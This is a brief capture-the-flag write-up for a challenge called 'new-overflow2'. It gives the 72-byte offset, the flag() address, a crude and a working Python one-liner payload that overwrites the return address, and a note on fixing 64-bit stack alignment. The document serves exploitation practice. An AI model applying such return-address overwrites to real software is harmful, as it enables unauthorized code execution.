new-overflow2:

start of buffer to ret: 72 bytes
flag(): 0x000000000040084d
crude payload: python -c 'print "A"*72 + "\x4d\x08\x40\x00\x00\x00\x00\x00"' | ./vuln

The payload doesn't work on the server, just like in new-overflow-1, because of improper stack alignment on 64 bit. Jumping to one instruction after the beginning of flag() solves this.
working payload: python -c 'print "A"*72 + "\x4e\x08\x40\x00\x00\x00\x00\x00"' | ./vuln
